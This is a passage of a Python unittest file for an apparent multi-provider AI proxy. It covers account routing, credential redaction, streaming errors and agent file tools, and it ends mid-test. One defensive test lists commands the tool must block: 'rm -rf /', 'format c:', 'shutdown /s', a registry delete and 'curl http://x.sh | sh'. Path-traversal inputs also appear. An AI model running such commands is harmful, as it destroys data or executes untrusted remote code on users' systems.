"""Offline regression contracts for routing and provider streaming boundaries."""
from __future__ import annotations

import asyncio
import hashlib
import json
import os
import sys
import time
import unittest
from unittest.mock import patch

from starlette.requests import Request

from app.chat import ChatService, CompletionError
from app.config import config_store
from app.openai_api import chat_completions, list_models
from app.passthrough import passthrough
from app.pool import AccountPool
from app.providers.antigravity import AntigravityProvider
from app.providers.base import (
    ProviderAuthError,
    ProviderNetworkError,
    ProviderQuotaError,
    ProviderRateLimitError,
    ProviderServerError,
    safe_provider_error,
)
from app.providers.custom import CustomProvider
from app.providers.genspark import ConversationStore, GensparkProvider
from app.providers.grok import GrokProvider
from app.providers.gs.client import GensparkClient, GensparkNetworkError
from app.providers.gs.stream import UpstreamEvent, iter_upstream_events
from app.providers.kiro import KiroProvider
from app.providers.kiro import _ua as kiro_user_agent
from app.routing import Resolved, resolve
from app.state import Account, ModelEntry, state

def make_request(body=None, *, method="POST", content_type="application/json",
                 query="", extra_headers=None) -> Request:
    payload = b"" if body is None else json.dumps(body).encode("utf-8")
    headers = [(b"host", b"127.0.0.1")]
    if content_type:
        headers.append((b"content-type", content_type.encode("latin-1")))
    for key, value in (extra_headers or {}).items():
        headers.append((key.lower().encode("latin-1"), value.encode("latin-1")))
    delivered = False

    async def receive():
        nonlocal delivered
        if delivered:
            return {"type": "http.disconnect"}
        delivered = True
        return {"type": "http.request", "body": payload, "more_body": False}

    return Request({
        "type": "http", "method": method, "path": "/",
        "headers": headers, "query_string": query.encode("ascii"),
    }, receive)

def response_json(response):
    return json.loads(response.body.decode("utf-8"))

class RoutingAndPoolContracts(unittest.TestCase):
    def test_round_robin_never_moves_reserve_ahead_of_primary(self):
        accounts = [
            Account("custom", {}, id="p1"),
            Account("custom", {}, id="r1", priority="reserve"),
            Account("custom", {}, id="p2"),
            Account("custom", {}, id="r2", priority="reserve"),
        ]
        candidate_pool = AccountPool()
        with patch.object(state, "usable_accounts", return_value=accounts), \
                patch.object(config_store.settings, "balancing", "round-robin"):
            orders = [[account.id for account in candidate_pool.ordered_candidates("custom")]
                      for _ in range(3)]
        self.assertEqual(orders[0], ["p1", "p2", "r1", "r2"])
        self.assertEqual(orders[1], ["p2", "p1", "r2", "r1"])
        self.assertTrue(all(order.index("r1") >= 2 and order.index("r2") >= 2
                            for order in orders))

    def test_ambiguous_unprefixed_model_requires_configured_default(self):
        first = ModelEntry("alpha", "kiro", "shared")
        second = ModelEntry("beta", "grok", "shared")

        owners = {"k": Account("kiro", {}, id="k"), "g": Account("grok", {}, id="g")}
        with patch.object(state, "models", {first.id: first, second.id: second}), \
                patch.object(state, "accounts", owners), \
                patch.object(config_store.settings, "default_provider", ""):
            self.assertIsNone(resolve("shared"))
        with patch.object(state, "models", {first.id: first, second.id: second}), \
                patch.object(state, "accounts", owners), \
                patch.object(config_store.settings, "default_provider", "beta"):
            self.assertIs(resolve("shared").entry, second)

    def test_models_endpoint_honors_disabled_prefixes_and_default(self):
        first = ModelEntry("alpha", "kiro", "shared")
        second = ModelEntry("beta", "grok", "shared")

        async def run():
            with patch("app.openai_api._check_auth", return_value=None), \
                    patch.object(state, "enabled_models", return_value=[first, second]), \
                    patch.object(config_store.settings, "use_prefixes", False), \
                    patch.object(config_store.settings, "default_provider", "beta"):
                return await list_models(make_request(method="GET", content_type=""))

        result = asyncio.run(run())
        self.assertEqual([item["id"] for item in result["data"]], ["shared"])
        self.assertEqual(result["data"][0]["owned_by"], "grok")

    def test_provider_errors_and_account_status_redact_known_credentials(self):
        account = Account(
            "custom",
            {"api_key": "api-secret-123", "cookies": "cookie-secret-456",
             "headers": '{"X-API-Key":"header-secret-789"}'},
            proxy="socks5://user:proxy-secret@proxy.invalid:1080",
        )
        raw = ("failed api-secret-123 cookie-secret-456 header-secret-789 "
               "socks5://user:proxy-secret@proxy.invalid:1080 Bearer bearer-secret")
        safe = safe_provider_error(raw, account)
        for secret in ("api-secret-123", "cookie-secret-456", "header-secret-789",
                       "proxy-secret", "bearer-secret"):
            self.assertNotIn(secret, safe)

        with patch("app.pool.state.save_accounts"):
            AccountPool().report_failure(account, ProviderAuthError(raw))
        self.assertNotIn("api-secret-123", account.status_message)
        self.assertNotIn("proxy-secret", account.status_message)

    def test_builtin_prefix_cannot_be_shadowed_by_custom_connection_name(self):
        accounts = {
            "builtin": Account("kiro", {}, id="builtin"),
            "custom": Account("custom", {"name": "kiro"}, id="custom"),
        }
        shadow = ModelEntry("kiro", "custom", "claude-sonnet-4-6")
        with patch.object(state, "accounts", accounts), \
                patch.object(state, "models", {shadow.id: shadow}), \
                patch.object(config_store.settings, "default_provider", ""):
            resolved = resolve("kiro-claude-sonnet-4-6")
        self.assertIsNotNone(resolved)
        self.assertEqual(resolved.provider, "kiro")
        self.assertIsNone(resolved.entry)
        self.assertIsNotNone(CustomProvider().validate_fields({
            "name": "kiro", "base_url": "https://api.test/v1",
        }))

class OpenAIProtocolContracts(unittest.TestCase):
    def test_malformed_top_level_messages_and_stream_types_return_400(self):
        cases = [
            [],
            {"model": "x", "messages": ["not-an-object"]},
            {"model": "x", "messages": [{"role": "user", "content": "x"}],
             "stream": "false"},
        ]

        async def run():
            results = []
            with patch("app.openai_api._check_auth", return_value=None):
                for body in cases:
                    results.append(await chat_completions(make_request(body)))
            return results

        responses = asyncio.run(run())
        self.assertEqual([response.status_code for response in responses], [400, 400, 400])

    def test_pre_stream_failure_keeps_real_http_status(self):
        async def missing(*_args, **_kwargs):
            raise CompletionError("missing", 404, "model_not_found")
            yield  # pragma: no cover

        async def run():
            with patch("app.openai_api._check_auth", return_value=None), \
                    patch("app.openai_api.chat_service.stream_completion", new=missing):
                return await chat_completions(make_request({
                    "model": "missing", "stream": True,
                    "messages": [{"role": "user", "content": "x"}],
                }))

        response = asyncio.run(run())
        self.assertEqual(response.status_code, 404)
        self.assertEqual(response_json(response)["error"]["type"], "model_not_found")

    def test_unexpected_exception_text_is_not_returned_to_client(self):
        async def broken(*_args, **_kwargs):
            raise RuntimeError("proxy-password-super-secret")
            yield  # pragma: no cover

        async def run():
            with patch("app.openai_api._check_auth", return_value=None), \
                    patch("app.openai_api.chat_service.stream_completion", new=broken):
                return await chat_completions(make_request({
                    "model": "broken", "stream": True,
                    "messages": [{"role": "user", "content": "x"}],
                }))

        response = asyncio.run(run())
        self.assertEqual(response.status_code, 500)
        self.assertNotIn("super-secret", response.body.decode("utf-8"))

    def test_unexpected_exception_text_is_redacted_from_all_committed_traces(self):
        async def before_output(*_args, **_kwargs):
            raise RuntimeError("proxy-password-super-secret")
            yield  # pragma: no cover

        async def after_output(*_args, **_kwargs):
            yield {
                "id": "chunk", "choices": [{"delta": {"content": "first"},
                                               "finish_reason": None}],
            }
            raise RuntimeError("Bearer stream-secret-token")

        async def run():
            committed = []
            with patch("app.openai_api._check_auth", return_value=None), \
                    patch("app.openai_api.state.commit_trace", side_effect=committed.append):
                for wants_stream in (False, True):
                    with patch("app.openai_api.chat_service.stream_completion", new=before_output):
                        await chat_completions(make_request({
                            "model": "broken", "stream": wants_stream,
                            "messages": [{"role": "user", "content": "x"}],
                        }))
                with patch("app.openai_api.chat_service.stream_completion", new=after_output):
                    response = await chat_completions(make_request({
                        "model": "broken", "stream": True,
                        "messages": [{"role": "user", "content": "x"}],
                    }))
                    _ = [chunk async for chunk in response.body_iterator]
            return committed

        committed = asyncio.run(run())
        self.assertEqual(len(committed), 3)
        serialized = " ".join(trace.error for trace in committed)
        self.assertNotIn("super-secret", serialized)
        self.assertNotIn("stream-secret-token", serialized)

    def test_nonstream_response_keeps_provider_finish_reason(self):
        async def completed(*_args, **_kwargs):
            yield {
                "id": "chunk", "choices": [{"delta": {"content": "partial"},
                                               "finish_reason": None}],
            }
            yield {
                "id": "chunk", "choices": [{"delta": {}, "finish_reason": "length"}],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1, "total_tokens": 2},
            }

        async def run():
            with patch("app.openai_api._check_auth", return_value=None), \
                    patch("app.openai_api.chat_service.stream_completion", new=completed), \
                    patch.object(state, "commit_trace"):
                return await chat_completions(make_request({
                    "model": "limited", "stream": False,
                    "messages": [{"role": "user", "content": "x"}],
                }))

        response = asyncio.run(run())
        self.assertEqual(response["choices"][0]["finish_reason"], "length")

    def test_reasoning_already_sent_turns_later_failure_into_midstream_abort(self):
        class ReasoningThenFailure:
            id = "test"

            async def chat_stream(self, *_args, **_kwargs):
                yield {"type": "reasoning", "text": "plan"}
                raise ProviderServerError("failed")

        async def run():
            service = ChatService()
            account = Account("test", {})
            chunks = []
            with patch.object(config_store, "provider_cfg",
                              return_value={"reasoning_output": "reasoning_content"}):
                iterator = service._attempt(ReasoningThenFailure(), account, "raw", "public", [], {})
                chunks.append(await anext(iterator))
                with self.assertRaises(Exception) as caught:
                    await anext(iterator)
            return chunks, caught.exception

        chunks, error = asyncio.run(run())
        self.assertEqual(chunks[0]["system_fingerprint"], "memuai")
        self.assertEqual(chunks[0]["choices"][0]["delta"]["reasoning_content"], "plan")
        self.assertEqual(type(error).__name__, "_MidStreamAbort")

    def test_provider_finish_reason_reaches_final_stream_chunk(self):
        class LimitedProvider:
            id = "test"

            async def chat_stream(self, *_args, **_kwargs):
                yield {"type": "text", "text": "partial"}
                yield {"type": "finish", "reason": "length"}

        async def run():
            chunks = [chunk async for chunk in ChatService()._attempt(
                LimitedProvider(), Account("test", {}), "raw", "public", [], {})]
            return chunks

        chunks = asyncio.run(run())
        self.assertEqual(chunks[-1]["choices"][0]["finish_reason"], "length")

    def test_client_cancel_cascades_to_active_provider_stream(self):
        class Provider:
            id = "test"

            def __init__(self):
                self.closed = False

            async def chat_stream(self, *_args, **_kwargs):
                try:
                    yield {"type": "text", "text": "first"}
                    await asyncio.Event().wait()
                finally:
                    self.closed = True

        async def run():
            provider = Provider()
            service = ChatService()
            account = Account("test", {})
            with patch.object(config_store.settings, "proxy_enabled", True), \
                    patch("app.chat.resolve", return_value=Resolved(None, "test", "model", "test")), \
                    patch.object(service, "_provider", return_value=provider), \
                    patch("app.chat.pool.ordered_candidates", return_value=[account]), \
                    patch("app.chat.pool.report_success"), patch("app.chat.pool.report_failure"):
                stream = service.stream_completion(
                    "test-model", [{"role": "user", "content": "x"}], {})
                await anext(stream)
                await stream.aclose()
            return provider.closed

        self.assertTrue(asyncio.run(run()))

    def test_unexpected_provider_failure_is_retried_without_leaking_credentials(self):
        class Provider:
            id = "test"

            async def chat_stream(self, account, *_args, **_kwargs):
                if account.id == "first":
                    raise RuntimeError("unmatched-internal-marker-7f3a")
                yield {"type": "text", "text": "recovered"}

        async def run():
            service = ChatService()
            accounts = [
                Account("test", {"api_key": "provider-secret-123"}, id="first"),
                Account("test", {}, id="second"),
            ]
            with patch.object(config_store.settings, "proxy_enabled", True), \
                    patch("app.chat.resolve", return_value=Resolved(None, "test", "model", "test")), \
                    patch.object(service, "_provider", return_value=Provider()), \
                    patch("app.chat.pool.ordered_candidates", return_value=accounts), \
                    patch("app.chat.pool.report_success"), \
                    patch("app.chat.pool.report_failure") as report_failure, \
                    patch("app.chat.log.warning") as warning:
                chunks = [chunk async for chunk in service.stream_completion(
                    "test-model", [{"role": "user", "content": "x"}], {})]
            return chunks, report_failure, warning

        chunks, report_failure, warning = asyncio.run(run())
        self.assertEqual(chunks[0]["choices"][0]["delta"]["content"], "recovered")
        report_failure.assert_called_once()
        self.assertNotIn("internal-marker-7f3a", str(warning.call_args))

    def test_nonretryable_client_error_does_not_fan_out_to_other_accounts(self):
        class Provider:
            id = "test"

            def __init__(self):
                self.attempted = []

            async def chat_stream(self, account, *_args, **_kwargs):
                self.attempted.append(account.id)
                raise ProviderServerError("invalid request", 422)
                yield  # pragma: no cover

        async def run():
            service = ChatService()
            provider = Provider()
            accounts = [Account("test", {}, id="first"), Account("test", {}, id="second")]
            with patch.object(config_store.settings, "proxy_enabled", True), \
                    patch("app.chat.resolve", return_value=Resolved(None, "test", "model", "test")), \
                    patch.object(service, "_provider", return_value=provider), \
                    patch("app.chat.pool.ordered_candidates", return_value=accounts), \
                    patch("app.chat.pool.report_failure") as report_failure:
                with self.assertRaises(CompletionError) as caught:
                    await anext(service.stream_completion(
                        "test-model", [{"role": "user", "content": "x"}], {}))
            return provider.attempted, report_failure, caught.exception

        attempted, report_failure, error = asyncio.run(run())
        self.assertEqual(attempted, ["first"])
        self.assertEqual(error.status, 422)
        report_failure.assert_not_called()

class FakeLineResponse:
    def __init__(self, lines=(), *, status=200, headers=None, chunks=()):
        self.status_code = status
        self.headers = headers or {"content-type": "text/event-stream"}
        self.lines = list(lines)
        self.chunks = list(chunks)
        self.closed = False
        self.text = ""

    async def aiter_lines(self):
        for line in self.lines:
            yield line

    async def aiter_content(self):
        for chunk in self.chunks:
            if isinstance(chunk, Exception):
                raise chunk
            yield chunk

    async def aclose(self):
        self.closed = True

class ProviderStreamingContracts(unittest.TestCase):
    def test_custom_done_terminates_stream_and_stream_error_keeps_429(self):
        account = Account("custom", {"name": "local", "base_url": "https://api.test/v1"})

        class Session:
            def __init__(self, response):
                self.response = response

            async def post(self, *_args, **_kwargs):
                return self.response

        async def collect(response):
            with patch("app.providers.custom.http.get_session", return_value=Session(response)):
                return [event async for event in CustomProvider().chat_stream(
                    account, "model", [{"role": "user", "content": "x"}], {})]

        response = FakeLineResponse([
            b'data: {"choices":[{"delta":{"content":"first"}}]}',
            b"data: [DONE]",
            b'data: {"choices":[{"delta":{"content":"must-not-appear"}}]}',
        ])
        self.assertEqual(asyncio.run(collect(response)), [{"type": "text", "text": "first"}])
        self.assertTrue(response.closed)

        rate_limited = FakeLineResponse([
            b'data: {"error":{"message":"slow down","type":"rate_limit_error"}}',
        ])
        with self.assertRaises(ProviderRateLimitError):
            asyncio.run(collect(rate_limited))

    def test_custom_prompt_cache_hints_are_family_specific(self):
        base = {"model": "x", "messages": [{"role": "system", "content": "stable"},
                                               {"role": "user", "content": "dynamic"}], "stream": True}
        openai, used = CustomProvider._with_prompt_cache(base, "gpt-5.6", True)
        self.assertTrue(used)
        self.assertIn("prompt_cache_key", openai)
        claude, used = CustomProvider._with_prompt_cache(base, "claude-sonnet", True)
        self.assertTrue(used)
        self.assertEqual(claude["messages"][0]["content"][0]["cache_control"], {"type": "ephemeral"})
        untouched, used = CustomProvider._with_prompt_cache(base, "gemini-pro", True)
        self.assertFalse(used)
        self.assertIs(untouched, base)

    def test_custom_prompt_cache_hint_falls_back_when_endpoint_rejects_it(self):
        account = Account("custom", {"name": "local", "base_url": "https://api.test/v1"})
        rejected = FakeLineResponse(status=422, chunks=[b"unknown prompt_cache_key"])
        accepted = FakeLineResponse([
            b'data: {"choices":[{"delta":{"content":"ok"},"finish_reason":"stop"}]}',
        ])

        class Session:
            def __init__(self):
                self.responses = [rejected, accepted]
                self.bodies = []

            async def post(self, *_args, **kwargs):
                self.bodies.append(kwargs["json"])
                return self.responses.pop(0)

        async def run():
            session = Session()
            with patch("app.providers.custom.http.get_session", return_value=session):
                events = [event async for event in CustomProvider().chat_stream(
                    account, "gpt-5.6", [{"role": "system", "content": "stable"},
                                         {"role": "user", "content": "dynamic"}], {})]
            return events, session.bodies

        events, bodies = asyncio.run(run())
        self.assertEqual(events, [{"type": "text", "text": "ok"}])
        self.assertIn("prompt_cache_key", bodies[0])
        self.assertNotIn("prompt_cache_key", bodies[1])

    def test_custom_accepts_nonstream_json_and_finish_reason_ends_stream(self):
        account = Account("custom", {"name": "local", "base_url": "https://api.test/v1"})

        class Session:
            def __init__(self, response):
                self.response = response

            async def post(self, *_args, **_kwargs):
                return self.response

        response = FakeLineResponse([
            json.dumps({"choices": [{"message": {"content": "ordinary JSON"},
                                     "finish_reason": "stop"}]}).encode(),
            json.dumps({"choices": [{"delta": {"content": "late"}}]}).encode(),
        ])

        async def run():
            with patch("app.providers.custom.http.get_session", return_value=Session(response)):
                return [event async for event in CustomProvider().chat_stream(
                    account, "model", [{"role": "user", "content": "x"}], {})]

        self.assertEqual(asyncio.run(run()), [{"type": "text", "text": "ordinary JSON"}])
        self.assertTrue(response.closed)

        pretty = FakeLineResponse([
            b"{", b'  "choices": [',
            b'    {"message": {"content": "pretty JSON"}, "finish_reason": "stop"}',
            b"  ]", b"}",
        ], headers={"content-type": "application/json"})

        async def pretty_run():
            with patch("app.providers.custom.http.get_session", return_value=Session(pretty)):
                return [event async for event in CustomProvider().chat_stream(
                    account, "model", [{"role": "user", "content": "x"}], {})]

        self.assertEqual(asyncio.run(pretty_run()), [{"type": "text", "text": "pretty JSON"}])
        self.assertTrue(pretty.closed)

    def test_custom_idle_timeout_is_typed_and_closes_response(self):
        account = Account("custom", {"name": "local", "base_url": "https://api.test/v1"})

        class StalledResponse(FakeLineResponse):
            async def aiter_lines(self):
                await asyncio.Event().wait()
                yield b""  # pragma: no cover

        class Session:
            def __init__(self, response):
                self.response = response

            async def post(self, *_args, **_kwargs):
                return self.response

        response = StalledResponse()

        async def run():
            with patch("app.providers.custom.http.get_session", return_value=Session(response)), \
                    patch.object(config_store.settings, "stream_idle_timeout", 0.01):
                await asyncio.wait_for(anext(CustomProvider().chat_stream(
                    account, "model", [{"role": "user", "content": "x"}], {})), timeout=0.2)

        with self.assertRaises(ProviderNetworkError):
            asyncio.run(run())
        self.assertTrue(response.closed)

    def test_kiro_rejects_instead_of_silently_dropping_unsupported_attachment(self):
        account = Account("kiro", {"region": "us-east-1"}, extra={"tokens": {
            "accessToken": "token", "expiresAt": time.time() + 3600,
        }})

        async def run():
            async def no_network(*_args, **_kwargs):
                raise AssertionError("attachment validation must happen before network access")

            with patch("app.providers.kiro.http.get_session", new=no_network):
                await anext(KiroProvider().chat_stream(account, "model", [{
                    "role": "user", "content": [
                        {"type": "image_url", "image_url": {"url": "https://example.test/image.png"}},
                    ],
                }], {}))

        with self.assertRaises(ProviderServerError) as caught:
            asyncio.run(run())
        self.assertEqual(caught.exception.status, 400)

    def test_genspark_context_hash_includes_attachment_identity(self):
        first = [{"role": "user", "content": [
            {"type": "text", "text": "describe"},
            {"type": "image_url", "filename": "a.png",
             "image_url": {"url": "data:image/png;base64,YQ=="}},
        ]}]
        second = [{"role": "user", "content": [
            {"type": "text", "text": "describe"},
            {"type": "image_url", "filename": "b.png",
             "image_url": {"url": "data:image/png;base64,Yg=="}},
        ]}]
        self.assertNotEqual(ConversationStore.hash_messages(first),
                            ConversationStore.hash_messages(second))

    def test_provider_protocol_identifiers_use_memuai(self):
        expected_seed = f"memuai-{os.getuid() if hasattr(os, 'getuid') else 'win'}"
        expected_fp = hashlib.sha256(expected_seed.encode()).hexdigest()[:16]
        self.assertTrue(kiro_user_agent().endswith(expected_fp))

        class Session:
            def __init__(self, payload):
                self.payload = payload

            async def post(self, *_args, **_kwargs):
                payload = self.payload

                class Response:
                    status_code = 200
                    text = "{}"

                    @staticmethod
                    def json():
                        return payload
                return Response()

        async def project_id(payload):
            account = Account("antigravity", {})
            with patch("app.providers.antigravity.http.get_session",
                       return_value=Session(payload)), \
                    patch("app.state.state.save_accounts"):
                return await AntigravityProvider()._project_id(account, "token")

        onboarded = {"done": True,
                     "response": {"cloudaicompanionProject": {"id": "real-project-7"}}}
        self.assertEqual(asyncio.run(project_id(onboarded)), "real-project-7")

        with self.assertRaises(ProviderAuthError):
            asyncio.run(project_id({"done": True}))

    def test_kiro_reads_the_aws_event_stream_and_surfaces_its_errors(self):
        import binascii
        from app.providers.kiro import KiroProvider, _take_event_frames

        def frame(headers, payload):
            raw_headers = b""
            for key, value in headers.items():
                name, text = key.encode(), value.encode()
                raw_headers += (bytes([len(name)]) + name + b"\x07"
                                + len(text).to_bytes(2, "big") + text)
            body = json.dumps(payload).encode()
            total = 12 + len(raw_headers) + len(body) + 4
            prelude = total.to_bytes(4, "big") + len(raw_headers).to_bytes(4, "big")
            prelude += binascii.crc32(prelude).to_bytes(4, "big")
            message = prelude + raw_headers + body
            return message + binascii.crc32(message).to_bytes(4, "big")

        stream = (frame({":event-type": "assistantResponseEvent"}, {"content": "Hel"})
                  + frame({":event-type": "assistantResponseEvent"}, {"content": "lo"})
                  + frame({":event-type": "messageMetadataEvent"}, {"conversationId": "x"}))
        buffer, frames = bytearray(), []
        for index in range(len(stream)):
            buffer += stream[index:index + 1]
            frames += _take_event_frames(buffer)
        self.assertEqual(len(frames), 3)
        self.assertEqual(len(buffer), 0)

        provider = KiroProvider()
        events = []
        for headers, payload in frames:
            events += provider._frame_events(headers, payload, "claude-sonnet-4-5")
        self.assertEqual([e["text"] for e in events], ["Hel", "lo"])

        throttled = _take_event_frames(bytearray(frame(
            {":message-type": "exception", ":exception-type": "ThrottlingException"},
            {"message": "slow down"})))
        with self.assertRaises(ProviderRateLimitError):
            provider._frame_events(throttled[0][0], throttled[0][1], "claude-sonnet-4-5")

        garbage = bytearray(b"not an event stream")
        self.assertEqual(_take_event_frames(garbage), [])
        self.assertEqual(len(garbage), len(b"not an event stream"))

    def test_antigravity_429_tries_other_endpoints_before_blaming_the_quota(self):
        from app.providers.antigravity import AntigravityProvider

        provider = AntigravityProvider()
        throttle = provider._classify_429(
            '{"error":{"message":"Resource exhausted","details":[{"reason":"RATE_LIMIT_EXCEEDED"}]}}',
            "https://cloudcode-pa.googleapis.com")
        self.assertIsInstance(throttle, ProviderRateLimitError)
        daily = provider._classify_429(
            '{"error":{"message":"Quota exhausted","details":[{"reason":"QUOTA_EXHAUSTED"}]}}',
            "https://cloudcode-pa.googleapis.com")
        self.assertIsInstance(daily, ProviderQuotaError)

        import pathlib
        root = pathlib.Path(__file__).resolve().parent.parent
        source = (root / "app" / "providers" / "antigravity.py").read_text(encoding="utf-8")

        self.assertNotIn("antigravity.google/auth-success", source)
        self.assertIn('flow["redirect_uri"] = redirect_uri', source)

    def test_last_error_is_cleared_by_the_next_successful_request(self):
        account = Account("kiro", {})
        account.record_result(False, error="boom")
        self.assertEqual(account.stats["last_error"], "boom")
        self.assertIn("last_error_at", account.stats)
        account.record_result(True, ms=120)

        self.assertNotIn("last_error", account.stats)
        self.assertNotIn("last_error_at", account.stats)

    def test_provider_settings_expose_a_web_search_mode(self):
        from app.providers import init_registry, meta_list

        init_registry()
        providers = {item["id"]: item for item in meta_list()}
        self.assertTrue(providers)
        for item in providers.values():
            keys = [field["key"] for field in item["settings"]]
            self.assertIn("web_search", keys)
        self.assertTrue(providers["genspark"]["native_search"])
        self.assertTrue(providers["antigravity"]["native_search"])
        self.assertFalse(providers["kiro"]["native_search"])
        self.assertIn("agent_mode", [f["key"] for f in providers["kiro"]["settings"]])

    def test_always_mode_searches_even_when_the_client_did_not_ask(self):
        from app import websearch

        hits = [{"title": "T", "url": "https://example.com/a", "snippet": "S"}]
        messages = [{"role": "system", "content": "sys"},
                    {"role": "user", "content": "какая погода"}]

        async def run():
            with patch("app.websearch.search", return_value=hits):
                return await websearch.augment(messages)

        out = asyncio.run(run())
        self.assertEqual(len(messages), 2, "the original history must stay untouched")
        self.assertEqual([m["role"] for m in out], ["system", "system", "user"])
        self.assertIn("<web_search_results>", out[1]["content"])
        self.assertIn("https://example.com/a", out[1]["content"])

        self.assertFalse(websearch._public_url("http://127.0.0.1/secret"))
        self.assertFalse(websearch._public_url("http://192.168.1.5/"))
        self.assertTrue(websearch._public_url("https://example.com/"))

    def test_work_tools_stay_inside_the_project_and_skip_dependencies(self):
        import tempfile
        from pathlib import Path as _Path
        from app import work_tools

        with tempfile.TemporaryDirectory() as folder:
            root = _Path(folder).resolve()
            (root / "src").mkdir()
            (root / "node_modules" / "left-pad").mkdir(parents=True)
            (root / "node_modules" / "left-pad" / "index.js").write_text("junk", encoding="utf-8")
            (root / "README.md").write_text("# Demo", encoding="utf-8")
            (root / "src" / "app.py").write_text(
                "def build(config):\n    return config\n", encoding="utf-8")

            overview = work_tools.project_overview(root)

            self.assertEqual(sorted(overview["files"]), ["README.md", "src/app.py"])
            self.assertIn("README.md", overview["entry_points"])

            found = work_tools.run("work_search", root, {"query": "build"})
            self.assertEqual(found["matches"][0]["path"], "src/app.py")
            symbols = work_tools.run("work_outline", root, {"path": "src/app.py"})
            self.assertEqual(symbols["symbols"][0]["name"], "build")

            patched = work_tools.run("work_patch", root, {
                "path": "src/app.py", "old_text": "return config", "new_text": "return dict(config)"})
            self.assertIn("+    return dict(config)", patched["diff"])
            self.assertIn("dict(config)", (root / "src" / "app.py").read_text(encoding="utf-8"))

            with self.assertRaises(work_tools.WorkError):
                work_tools.run("work_patch", root, {
                    "path": "src/app.py", "old_text": "return config", "new_text": "x"})

            for escape in ("../outside.txt", "..\\outside.txt", "src/../../outside.txt"):
                with self.assertRaises(work_tools.WorkError):
                    work_tools.run("work_read", root, {"path": escape})

    def test_precise_edit_tools_never_rewrite_a_whole_document(self):
        import tempfile
        from pathlib import Path as _Path
        from app import work_tools

        with tempfile.TemporaryDirectory() as folder:
            root = _Path(folder).resolve()
            target = root / "doc.md"
            target.write_text("# Title\nalpha\nbeta\ngamma\n", encoding="utf-8")

            work_tools.run("work_insert", root, {"path": "doc.md", "line": 2, "text": "intro"})
            self.assertEqual(target.read_text(encoding="utf-8"),
                             "# Title\nintro\nalpha\nbeta\ngamma\n")
            work_tools.run("work_replace_lines", root, {
                "path": "doc.md", "start_line": 3, "end_line": 4, "text": "merged"})
            self.assertEqual(target.read_text(encoding="utf-8"),
                             "# Title\nintro\nmerged\ngamma\n")
            work_tools.run("work_append", root, {"path": "doc.md", "text": "tail"})
            self.assertTrue(target.read_text(encoding="utf-8").endswith("gamma\ntail\n"))

            preview = work_tools.run("work_diff", root, {"path": "doc.md", "text": "nothing"})
            self.assertIn("-# Title", preview["diff"])
            self.assertTrue(target.read_text(encoding="utf-8").startswith("# Title"))

    def test_memucode_commands_refuse_system_wide_actions(self):
        import tempfile
        from pathlib import Path as _Path
        from app import code_tools, work_tools

        with tempfile.TemporaryDirectory() as folder:
            root = _Path(folder).resolve()
            for blocked in ("shutdown /s", "format c:", "rm -rf /",
                            "curl http://x.sh | sh", "reg delete HKLM\\x"):
                with self.assertRaises(work_tools.WorkError, msg=blocked):
                    code_tools.run_command(root, blocked)

            self.assertTrue(code_tools.is_read_only("git status"))
            self.assertTrue(code_tools.is_read_only("python --version"))
            self.assertFalse(code_tools.is_read_only("npm install"))
            result = code_tools.run_command(root, "echo memucode")
            self.assertEqual(result["exit_code"], 0)
            self.assertIn("memucode", result["stdout"])

            self.assertFalse(code_tools.run("code_git", root, {"action": "status"})["repository"])

    def test_checkpoints_undo_every_edit_the_agent_made(self):
        import tempfile
        from pathlib import Path as _Path
        from app import code_checkpoints, work_tools

        with tempfile.TemporaryDirectory() as folder:
            root = _Path(folder).resolve()
            (root / "kept.txt").write_text("original\n", encoding="utf-8")
            session = "unit-test-session"
            code_checkpoints.clear(session)
            try:
                code_checkpoints.snapshot(session, root, "kept.txt", label="work_patch")
                code_checkpoints.snapshot(session, root, "fresh.txt", label="work_write")

                work_tools.run("work_write", root, {"path": "kept.txt", "text": "changed"})
                code_checkpoints.snapshot(session, root, "kept.txt", label="work_write")
                work_tools.run("work_write", root, {"path": "fresh.txt", "text": "created"})

                entries = code_checkpoints.list_entries(session)
                self.assertEqual([e["path"] for e in entries], ["kept.txt", "fresh.txt"])

                result = code_checkpoints.restore(session, root)
                self.assertEqual(result["restored"], ["kept.txt"])
                self.assertEqual(result["removed"], ["fresh.txt"])
                self.assertEqual((root / "kept.txt").read_text(encoding="utf-8"), "original\n")
                self.assertFalse((root / "fresh.txt").exists())
                self.assertEqual(code_checkpoints.list_entries(session), [])
            finally:
                code_checkpoints.clear(session)

    def test_mcp_client_speaks_the_protocol_and_flattens_results(self):
        import tempfile
        import textwrap
        from pathlib import Path as _Path
        from app import mcp_client

        server_source = textwrap.dedent('''
            import json, sys
            def send(obj):
                sys.stdout.write(json.dumps(obj) + "\\n"); sys.stdout.flush()
            for line in sys.stdin:
                line = line.strip()
                if not line:
                    continue
                msg = json.loads(line)
                method, mid = msg.get("method"), msg.get("id")
                if method == "initialize":
                    send({"jsonrpc": "2.0", "id": mid, "result": {"capabilities": {}}})
                elif method == "tools/list":
                    send({"jsonrpc": "2.0", "id": mid, "result": {"tools": [
                        {"name": "echo", "description": "Echoes", "inputSchema": {}}]}})
                elif method == "tools/call":
                    text = (msg["params"].get("arguments") or {}).get("text", "")
                    send({"jsonrpc": "2.0", "id": mid,
                          "result": {"content": [{"type": "text", "text": text}]}})
                elif mid is not None:
                    send({"jsonrpc": "2.0", "id": mid,
                          "error": {"code": -32601, "message": "unknown"}})
        ''')
        with tempfile.TemporaryDirectory() as folder:
            script = _Path(folder) / "server.py"
            script.write_text(server_source, encoding="utf-8")
            registry = mcp_client.MCPRegistry()

            async def run():
                server = mcp_client.MCPServer("probe", {
                    "command": sys.executable, "args": [str(script)],
                    "env": {}, "cwd": "", "enabled": True, "description": ""})
                await server.start()
                try:
                    self.assertEqual([t["name"] for t in server.tools], ["echo"])

                    answer = await server.call("echo", {"text": "привет"})
                    self.assertEqual(answer["content"], "привет")
                    self.assertFalse(answer["is_error"])
                finally:
                    await server.stop()
                    await registry.stop_all()

            asyncio.run(run())

        self.assertEqual(mcp_client._flatten_content(
            [{"type": "text", "text": "a"}, {"type": "text", "text": "b"}]), "a\nb")

    def test_genspark_yields_first_text_before_upstream_finishes_and_cleans_cancel(self):
        response = FakeLineResponse()

        class Client:
            def __init__(self):
                self.deleted = []

            def build_agent_payload(self, **_kwargs):
                return {}

            def build_copilot_payload(self, **_kwargs):
                return {}

            async def stream_chat(self, *_args, **_kwargs):
                return response

            async def delete_project(self, _cookie, project_id, **_kwargs):
                self.deleted.append(project_id)

        async def events(*_args, **_kwargs):
            yield UpstreamEvent("project", project_id="project-1")
            yield UpstreamEvent("text", text="first")
            await asyncio.Event().wait()

        async def run():
            provider = GensparkProvider()
